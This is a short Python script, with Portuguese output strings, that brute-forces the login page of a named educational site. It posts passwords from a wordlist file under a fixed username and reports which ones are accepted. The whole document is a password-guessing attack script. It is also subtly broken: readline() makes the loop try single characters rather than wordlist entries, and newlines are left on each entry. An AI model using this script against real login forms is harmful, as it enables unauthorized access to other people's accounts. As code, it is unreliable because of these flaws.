import requests

url = 'http://ensino.solyd.com.br/login/index.php'

arquivo = open('file.txt')
linhas = arquivo.readline()

for linha in linhas:
    dados = {'username': 'aaaaaaaa',
             'password': linha}
    resposta = requests.post(url, data=dados)

    if "senha errados" in resposta.text:
        print("Senha incorreta:", linha)
    else:
        print("Senha correta:", linha)
